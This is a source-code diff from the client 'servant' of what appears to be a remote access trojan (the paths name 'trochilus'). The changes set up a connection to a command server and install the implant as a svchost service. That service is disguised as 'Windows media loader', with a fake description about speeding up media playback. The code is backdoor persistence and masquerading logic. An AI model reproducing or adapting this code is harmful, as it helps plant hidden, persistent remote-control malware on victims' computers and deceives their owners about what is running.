@@ -9,23 +9,35 @@
 #include "ServiceManager.h"
 #include "main.h"
 #include "common.h"
+#include "BinNames.h"
 
-SERVANT_API BOOL InitServant(const PCONFIG_INFO pConfigInfo)
+
+SERVANT_API void InitServant()
 {
-	debugLog(_T("init servant. server : %s:%d"), a2t(pConfigInfo->szAddr),pConfigInfo->nPort);
+#ifdef _DEBUG
+	g_ConfigInfo.nDefaultCommType = COMMNAME_UDP;
+	g_ConfigInfo.nPort = 8082;
+	g_ConfigInfo.nFirstConnectHour = -1;
+	g_ConfigInfo.nFirstConnectMinute = -1;
+	g_ConfigInfo.nTryConnectIntervalM = 1;
+	strcpy_s(g_ConfigInfo.szGroups, sizeof(g_ConfigInfo.szGroups), "Default");
+	strcpy_s(g_ConfigInfo.szAddr, sizeof(g_ConfigInfo.szAddr), "127.0.0.1");
+#endif
+	WSADATA wsaData = {0};
+	::WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-	g_ConfigInfo = *pConfigInfo;
+	debugLog(_T("init servant. server : %s:%d"), a2t(g_ConfigInfo.szAddr),g_ConfigInfo.nPort);
 
 	if (! CommManager::GetInstanceRef().Init())
 	{
 		errorLog(_T("init commmgr failed"));
-		return FALSE;
+		return;
 	}
 
 	if (! Manager::GetInstanceRef().Init())
 	{
 		errorLog(_T("init servant manager failed"));
-		return FALSE;
+		return;
 	}
 
 	CommManager::GetInstanceRef().SetDefaultComm((COMM_NAME)g_ConfigInfo.nDefaultCommType);
@@ -38,21 +50,31 @@ SERVANT_API BOOL InitServant(const PCONFIG_INFO pConfigInfo)
 	if (! CommManager::GetInstanceRef().StartMessageWorker(1000 * 30, 10, 1000))
 	{
 		errorLog(_T("start comm failed"));
-		return FALSE;
+		return;
 	}
 
-	//加载本地模块
-//	ServantManager::GetInstanceRef().AddAllLocalModules();
- 	
-	return TRUE;
+	return;
 }
 
-SERVANT_API void InstallService(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR descripion, LPCTSTR filepath, LPCTSTR svchostName)
+SERVANT_API void InstallService()
 {
-	infoLog(_T("%s | %s | %s | %s | %s "),serviceName,displayName,descripion,filepath,svchostName);
+#ifdef _DEBUG
+	strcpy_s(g_ServiceInfo.szDisplayName, "Windows media loader");
+	strcpy_s(g_ServiceInfo.szServiceDecript, "maker your mediaplayer load media file faster");
+	strcpy_s(g_ServiceInfo.szServiceName, "medialoader");
+	lstrcpy(g_ServiceInfo.szInstalPath,_T("C:\\source\\trochilus\\client\\binD\\"));
+#endif
 
-	ServiceManager::GetInstanceRef().InstallSvchostService(serviceName,displayName,descripion,filepath,svchostName);
-	ServiceManager::GetInstanceRef().StartService(serviceName);
+	tstring filePath = GetBinFilepath();
+	filePath += _T("\\");
+	filePath += SERVANT_SHELL_BINNAME;
+
+	
+
+	infoLog(_T("%s | %s | %s | %s | %s "),a2t(g_ServiceInfo.szServiceName),a2t(g_ServiceInfo.szDisplayName),a2t(g_ServiceInfo.szServiceDecript),filePath.c_str(),SERVANT_SHELL_BINNAME);
+
+	ServiceManager::GetInstanceRef().InstallSvchostService(a2t(g_ServiceInfo.szServiceName),a2t(g_ServiceInfo.szDisplayName),a2t(g_ServiceInfo.szServiceDecript),filePath.c_str(),SERVANT_SVCHOST_NAME);
+	ServiceManager::GetInstanceRef().StartService((a2t(g_ServiceInfo.szServiceName)));
 
 }
 
@@ -94,13 +116,13 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	LPVOID lpReserved
 	)
 {
-// 	switch (ul_reason_for_call)
-// 	{
+	switch (ul_reason_for_call)
+	{
 // 	case DLL_PROCESS_ATTACH:
 // 	case DLL_THREAD_ATTACH:
 // 	case DLL_THREAD_DETACH:
 // 	case DLL_PROCESS_DETACH:
-//	}
+	}
 
 	return TRUE;
 }
